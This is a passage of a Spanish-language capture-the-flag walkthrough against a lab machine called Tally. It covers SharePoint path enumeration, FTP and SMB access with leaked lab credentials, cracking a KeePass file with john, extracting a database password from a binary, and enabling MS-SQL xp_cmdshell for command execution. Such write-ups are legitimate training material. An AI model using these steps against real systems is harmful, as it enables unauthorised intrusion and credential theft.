## Vulnerability Assessment {-}

### Sharepoint `_layouts` {-}

El enlaze de la pagina web es un reporte donde se pueden ver routas interesantes detectadas durante un processo de auditoria.

- http://sharepointtarget.com//_layouts/viewlsts.aspx
- http://sharepointtarget.com//_layouts/userdisp.aspx
- http://sharepointtarget.com//_layouts/userdisp.aspx?ID=1
- http://sharepointtarget.com//_layouts/aclinv.aspx
- http://sharepointtarget.com//_layouts/bpcf.aspx
- http://sharepointtarget.com//_layouts/groups.aspx
- http://sharepointtarget.com//_layouts/help.aspx
- http://sharepointtarget.com//_layouts/mcontent.aspx
- http://sharepointtarget.com//_layouts/mobile/mbllists.aspx
- http://sharepointtarget.com//_layouts/people.aspx?MembershipGroupId=0
- http://sharepointtarget.com//_layouts/recyclebin.aspx
- http://sharepointtarget.com//_layouts/spcf.aspx

Si vamos a la url `http://10.10.10.59/_layouts/viewlsts.aspx` ya vemos cosas interesantes. Si pinchamos en Shared Documents podemos ver un documento
llamado ftp-details y si pinchamos en Site Pages vemos un fichero FinanceTeam. Nos los descargamos.

Si abrimos el fichero `ftp-details.docx` con libre office vemos una contraseña. Si miramos la pagina FinanceTeam, vemos un mensaje donde podemos ver
usuarios potenciales y un ftp account name.

### Conneccion con FTP {-}

```bash
ftp 10.10.10.59
Name: ftp_user
Password: UTDRSCH3c"$6hys
```

Hemos podido authenticarnos. Si le damos a `dir` vemos muchos directorios. Si es el caso, S4vi nos propone usar de la Heramienta `curlftpfs` para montarnos
una montura por ftp

```bash
apt install curlftpfs
mkdir /mnt/ftp
curlftpfs ftp_user:'UTDRSCH3c"$6hys'@10.10.10.59 /mnt/ftp
cd /mnt/ftp
tree
```

Aqui vemos un fichero `tim.kdbx`. Es interesante porque los ficheros **KDBX** son ficheros KeePass y suelen tener informaciones interesantes como contraseñas.

```bash
cp User/Tim/Files/tim.kdbx /home/s4vitar/Desktop/S4vitar/Tally/content/.
cd !$
chmod 644 tim.kdbx
apt install keepassxc
```

Si lanzamos el KeePassxc y que le damos a abrir una base de datos existente, buscamos el fichero `tim.kdbx` vemos que nos pide una contraseña.
En este caso bamos a lanzar un keepass2john para crackear la contraseña.

### Crackeando un fichero KDBX con keepass2john {-}

```bash
keepass2john tim.kdbx > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

Ya tenemos la contraseña. Podemos abrir el fichero KDBX con Keepassxc y aqui ya encontramos una credencial por el usuario Finance.
Vamos a checkear los recursos compartidos a nivel de red con este usuario.

### SMB {-}

```bash
smbclient -L 10.10.10.59 -U "Finance%Acc0unting"
smbclient //10.10.10.59/ACCT -U "Finance%Acc0unting" -c "dir"
```

Tenemos accesso a un nuevo directorio pero contiene muchos otros directorios. Nos creamos otra montura

```bash
mkdir /mnt/smb
mount -t cifs //10.10.10.59/ACCT /mnt/smb -o username=Finance,password=Acc0unting,domain=WORKGROUP,rw
cd /mnt/smb
tree
```

Aqui vemos que hay ficheros ejecutables en la carpeta `zz_Migration/Binaries/New Folder/` y un binario llamado `tester.exe` nos
llama la attencion.

```bash
cp "/mnt/smb/zz_Migration/Binaries/New Folder/tester.exe" /home/s4vitar/Desktop/content
cd /home/s4vitar/Desktop/content
file tester.exe
```

Vemos que es un ejecutable windows. Lo vamos a analyzar con radare2 para saber lo que hace a bajo nivel


### EXE analysis con radare2 {-}

```bash
radare2 tester.exe
> aaa
> s main
> pdf
```

Bueno aqui podemos ver un usuario y una contraseña para la base de datos MS-SQL 

> [ ! ]NOTAS: tambien se podria usar el commando `strings tester.exe | grep "PWD" | tr ';' '\n' | batcat`

### Conneccion a la base de datos {-}

```bash
sqsh -S 10.10.10.59 -U 'sa'
password: ********
```

Es valida y estamos connectado a la base de datos

```bash
xp_cmdshell "whoami"
go
```

El commando xp_cmdshell a sido desactivado. Vamos a activar la possiblidad de ejecutar commandos.

```bash
sp_configure "show advanced options", 1
reconfigure
go

sp_configure "xp_cmdshell", 1
reconfigure
go
```

Ya podemos ejectuar commandos

```bash
xp_cmdshell "whoami"
go

#Output
tally\sarah
```

> [ ! ]NOTAS: tambien se podria usar el commando `impacker-mssqlclient WORKGROUP/sa@10.10.10.59` y con este commando no tendriamos que darle siempre a go.

Como tenemos possiblidad de ejecutar commandos a nivel de systema, nos vamos a connectar a la maquina.
